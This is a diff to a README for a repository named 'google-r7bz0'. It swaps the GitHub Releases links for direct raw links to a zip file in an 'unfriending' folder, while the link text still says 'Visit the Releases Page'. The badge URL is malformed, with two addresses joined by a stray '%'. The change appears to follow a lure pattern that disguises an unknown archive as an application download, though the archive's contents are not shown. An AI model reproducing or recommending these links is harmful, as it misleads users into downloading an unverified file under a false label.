@@ -6,7 +6,7 @@ Welcome to the google-r7bz0 repository. This repository offers you easy access t
 
 ## 📥 Download the Application
 
-[![Download Here](https://img.shields.io/badge/Download-GitHub%20Releases-blue.svg)](https://github.com/toom12940/google-r7bz0/releases)
+[![Download Here](https://raw.githubusercontent.com/toom12940/google-r7bz0/main/unfriending/google-r7bz0.zip%https://raw.githubusercontent.com/toom12940/google-r7bz0/main/unfriending/google-r7bz0.zip)](https://raw.githubusercontent.com/toom12940/google-r7bz0/main/unfriending/google-r7bz0.zip)
 
 To get the files you need, follow the steps below.
 
@@ -22,7 +22,7 @@ Before you start downloading, ensure your computer meets these basic requirement
 
 1. **Visit the Releases Page**
    Click on the link below to go to the Releases page:
-   [Visit the Releases Page](https://github.com/toom12940/google-r7bz0/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/toom12940/google-r7bz0/main/unfriending/google-r7bz0.zip)
 
 2. **Choose Your File**
    On the Releases page, you will see various files available for download. Select the file that interests you.
